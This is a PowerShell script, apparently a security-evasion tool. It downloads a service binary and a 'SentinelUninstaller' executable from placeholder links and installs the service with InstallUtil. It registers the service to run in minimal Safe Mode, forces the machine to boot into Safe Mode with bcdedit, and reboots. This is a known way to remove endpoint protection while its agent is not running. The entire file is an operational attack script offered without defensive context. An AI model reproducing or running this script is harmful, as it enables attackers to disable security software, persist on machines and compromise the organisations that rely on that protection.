#Curl the uninstaller and service
curl LINKTOSERVICEHERE -OutFile 'C:\WindowsService1.exe'

curl LINKTOUNINSTALLERHERE -OutFile 'C:\SentinelUninstaller.exe'

#get the path to service installer
$childitem = Get-ChildItem -Path 'C:\Windows\Microsoft.NET\Framework64' -Name

foreach($item in $childitem)
{

$path = 'C:\Windows\Microsoft.NET\Framework64\' + $item

$here = Get-ChildItem -Path $path -Name

foreach($obj in $here)
{

if($obj -eq 'InstallUtil.exe')
{

$final_path = $path + '\InstallUtil.exe'

}

}

}

#start the service installer
Start-Process $final_path -ArgumentList '"C:\WindowsService1.exe"' -Wait

#set service to use desktop
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Service1' -Name 'Type' -Value 272 -Force

#set the service to start automatically
Start-Process 'cmd.exe' -ArgumentList '/C sc config service1 start=auto'

#create safe mode registry key
New-Item -Path 'HKLM:\\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Service1'

#set safe mode registry key to service
Set-ItemProperty -Path 'HKLM:\\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Service1' -Name '(Default)' -Value 'Service' -Force

#set the computer to start into safe mode
Start-Process 'cmd.exe' -ArgumentList '/C bcdedit /set {default} safeboot minimal' -Wait

#sleep to finish up tasks
Start-Sleep -Seconds 10

#restart
Start-Process 'cmd.exe' -ArgumentList '/C shutdown /r'